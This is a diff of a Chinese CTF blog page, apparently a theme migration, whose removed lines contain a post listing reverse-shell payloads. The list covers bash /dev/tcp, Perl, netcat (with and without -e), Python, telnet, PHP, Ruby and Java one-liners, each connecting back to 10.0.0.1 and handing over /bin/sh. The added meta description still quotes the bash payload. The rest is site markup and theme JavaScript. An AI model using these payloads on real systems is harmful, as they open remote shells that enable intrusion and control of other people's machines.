@@ -1,566 +1,199 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
-  <link rel="mask-icon" href="/images/tu.ico" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="前言：&amp;emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。 这么多的payload总有一个适合你bash版本1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持。 Perl版">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反弹shell payload总结 | 信安小蚂蚁</title><meta name="author" content="信安小蚂蚁"><meta name="copyright" content="信安小蚂蚁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：&amp;emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。 这么多的payload总有一个适合你bash版本1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持。 Perl版本1perl -e &amp;#x27;use">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell payload总结">
 <meta property="og:url" content="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="信安小蚂蚁">
-<meta property="og:description" content="前言：&amp;emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。 这么多的payload总有一个适合你bash版本1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持。 Perl版">
+<meta property="og:description" content="前言：&amp;emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。 这么多的payload总有一个适合你bash版本1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持。 Perl版本1perl -e &amp;#x27;use">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mayi077.github.io/images/1.jpg">
 <meta property="article:published_time" content="2020-03-27T01:07:51.000Z">
 <meta property="article:modified_time" content="2020-03-27T01:34:42.000Z">
 <meta property="article:author" content="信安小蚂蚁">
 <meta property="article:tag" content="基础积累">
 <meta property="article:tag" content="日常笔记">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true
-  };
-</script>
-
-  <title>反弹shell payload总结 | 信安小蚂蚁</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">信安小蚂蚁</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-  </div>
-
-  <div class="site-nav-right"></div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-        <li class="menu-item menu-item-主页">
-
-    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
-        </a>
-      </li>
-  </ul>
-
-</nav>
-  <div class="site-search">
-    <div class="popup search-popup">
-    <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="off"
-           placeholder="搜索..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result"></div>
-
-</div>
-<div class="search-pop-overlay"></div>
-
-  </div>
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content">
-            
-
-  <div class="posts-expand">
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/1.jpg">
-      <meta itemprop="name" content="信安小蚂蚁">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="信安小蚂蚁">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          反弹shell payload总结
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-03-27 09:07:51 / 修改时间：09:34:42" itemprop="dateCreated datePublished" datetime="2020-03-27T09:07:51+08:00">2020-03-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">日常笔记</span>
-                  </a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>&emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。</p>
-<h3 id="这么多的payload总有一个适合你"><a href="#这么多的payload总有一个适合你" class="headerlink" title="这么多的payload总有一个适合你"></a>这么多的payload总有一个适合你</h3><h4 id="bash版本"><a href="#bash版本" class="headerlink" title="bash版本"></a>bash版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>注意这个是由解析shell的bash完成，所以某些情况下不支持。</p>
-<h4 id="Perl版本"><a href="#Perl版本" class="headerlink" title="Perl版本"></a>Perl版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
-<p>下面这个可以说是上面的升级版了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
-
-<h4 id="nc-版"><a href="#nc-版" class="headerlink" title="nc 版"></a>nc 版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>
-<p>版本问题或不支持-e可使用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>
-
-<h4 id="python-版"><a href="#python-版" class="headerlink" title="python 版"></a>python 版</h4><p>应该是python2和python3通用的(测试用的python2.7)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
-<p>或者：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;10.0.0.1&#39;,1234))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Telnet版本"><a href="#Telnet版本" class="headerlink" title="Telnet版本"></a>Telnet版本</h4><p>当nc不可用或/dev/tcp不可用时可以考虑：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 1234 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-
-<h4 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>
-
-<h4 id="Ruby版"><a href="#Ruby版" class="headerlink" title="Ruby版"></a>Ruby版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure>
-<p>不依赖于/bin/sh的shell：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;10.0.0.1&quot;,&quot;1234&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
-<p>如果目标系统运行Windows：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;c&#x3D;TCPSocket.new(&quot;10.0.0.1&quot;,&quot;1234&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
-
-<h4 id="java版"><a href="#java版" class="headerlink" title="java版"></a>java版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r &#x3D; Runtime.getRuntime()</span><br><span class="line">p &#x3D; r.exec([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
-
-    </div>
-
-    
-    
-    
-        
-
-<div>
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>信安小蚂蚁
-  </li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    <a href="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/" title="反弹shell payload总结">https://mayi077.github.io/2020/03/27/反弹shell-payload总结/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
-  </li>
-</ul>
-</div>
-
-     <div>
-       
-         ﻿<div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
-    
-</div>
-         
-      </div>
-
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
-              <a href="/tags/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i>日常笔记</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2020/03/25/HITCON-2017-SSRFme/" rel="prev" title="[HITCON 2017]SSRFme">
-      <i class="fa fa-chevron-left"></i> [HITCON 2017]SSRFme
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/03/28/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E5%8C%A0%E5%B7%A5%E5%9D%8A-%E6%AF%94%E8%B5%9B/" rel="next" title="记一次 信息安全工匠工坊 比赛">
-      记一次 信息安全工匠工坊 比赛 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-  </div>
-
-
-          </div>
-          
-    <div class="comments" id="gitalk-container"></div>
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let activeClass = CONFIG.comments.activeClass;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
+<meta name="twitter:image" content="https://mayi077.github.io/images/1.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "反弹shell payload总结",
+  "url": "https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/",
+  "image": "https://mayi077.github.io/images/1.jpg",
+  "datePublished": "2020-03-27T01:07:51.000Z",
+  "dateModified": "2020-03-27T01:34:42.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "信安小蚂蚁",
+      "url": "https://mayi077.github.io"
     }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
       }
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
 
-        </div>
-          
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
   
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这么多的payload总有一个适合你"><span class="nav-number">2.</span> <span class="nav-text">这么多的payload总有一个适合你</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bash版本"><span class="nav-number">2.1.</span> <span class="nav-text">bash版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl版本"><span class="nav-number">2.2.</span> <span class="nav-text">Perl版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc-版"><span class="nav-number">2.3.</span> <span class="nav-text">nc 版</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-版"><span class="nav-number">2.4.</span> <span class="nav-text">python 版</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Telnet版本"><span class="nav-number">2.5.</span> <span class="nav-text">Telnet版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php版本"><span class="nav-number">2.6.</span> <span class="nav-text">php版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Ruby版"><span class="nav-number">2.7.</span> <span class="nav-text">Ruby版</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java版"><span class="nav-number">2.8.</span> <span class="nav-text">java版</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接："><span class="nav-number">3.</span> <span class="nav-text">参考链接：</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
-      src="/images/1.jpg">
-  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives">
-          <span class="site-state-item-count">135</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-        <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-        <span class="site-state-item-count">86</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
         
-
-<div class="copyright">
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
   
-  &copy; 
-  <span itemprop="copyrightYear">2026</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
-</div>
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '反弹shell payload总结',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
